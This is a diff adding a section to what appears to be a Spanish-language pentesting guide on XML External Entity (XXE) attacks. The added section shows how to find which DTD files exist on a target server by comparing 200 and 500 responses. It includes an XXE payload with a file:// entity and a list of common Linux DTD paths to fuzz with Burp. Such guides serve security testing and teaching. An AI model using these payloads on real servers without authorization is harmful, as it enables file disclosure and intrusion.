@@ -304,6 +304,40 @@ Si el servidor interpreta ese parámetro como XML y aplica XInclude, se incluir�
 
 ### 8) XXE usando DTD local (docbookx.dtd) y niveles de expansión
 
+1. ¿Cómo averiguo qué DTDs existen en el servidor?
+Como no tienes acceso al sistema de archivos, tienes que usar el propio parser XML como un escáner de puertos, pero para archivos.
+
+La técnica del Error 200 vs Error 500:
+Envías una petición con una referencia a un archivo DTD común.
+
+Si el servidor responde 200 OK (o el mensaje normal): La DTD existe.
+
+Si el servidor responde 500 Internal Server Error (indicando que no encontró el recurso): La DTD no existe.
+
+Payload de enumeración:
+
+```XML
+<!DOCTYPE foo [
+    <!ENTITY % check SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+    %check;
+]>
+<root>
+    test
+</root>
+```
+
+Lista de rutas comunes para probar (Fuzzing):
+Debes hacer un "intruder" en Burp con estas rutas típicas de Linux (donde suelen estar instaladas por defecto):
+
+1 - `/usr/share/yelp/dtd/docbookx.dtd` (Muy común en Ubuntu/Debian)
+
+2 - `/usr/share/xml/fontconfig/fonts.dtd`
+
+3 - `/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd`
+
+4 - `/usr/share/xml/metacity/metacity-theme.dtd`
+
+
 **Payload** (usa `docbookx.dtd` instalado localmente):
 
 ```xml
